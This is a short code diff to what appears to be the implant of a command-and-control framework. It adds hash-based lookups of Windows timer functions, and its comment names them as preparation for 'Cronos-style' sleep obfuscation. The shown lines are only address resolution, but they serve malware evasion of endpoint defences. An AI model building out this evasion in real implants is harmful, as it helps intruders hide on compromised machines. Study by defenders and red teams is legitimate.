@@ -369,6 +369,10 @@ VOID DemonInit( PVOID ModuleInst, PKAYN_ARGS KArgs )
         Instance->Win32.NtQueryInformationThread          = LdrFunctionAddr( Instance->Modules.Ntdll, H_FUNC_NTQUERYINFORMATIONTHREAD );
         Instance->Win32.NtQueryObject                     = LdrFunctionAddr( Instance->Modules.Ntdll, H_FUNC_NTQUERYOBJECT );
         Instance->Win32.NtTraceEvent                      = LdrFunctionAddr( Instance->Modules.Ntdll, H_FUNC_NTTRACEEVENT );
+        /* ARC-03: Cronos-style timer-callback sleep obfuscation */
+        Instance->Win32.NtCreateTimer                     = LdrFunctionAddr( Instance->Modules.Ntdll, H_FUNC_NTCREATETIMER );
+        Instance->Win32.NtSetTimer                        = LdrFunctionAddr( Instance->Modules.Ntdll, H_FUNC_NTSETTIMER );
+        Instance->Win32.NtCancelTimer                     = LdrFunctionAddr( Instance->Modules.Ntdll, H_FUNC_NTCANCELTIMER );
     } else {
         PUTS( "Failed to load ntdll from PEB" )
         return;
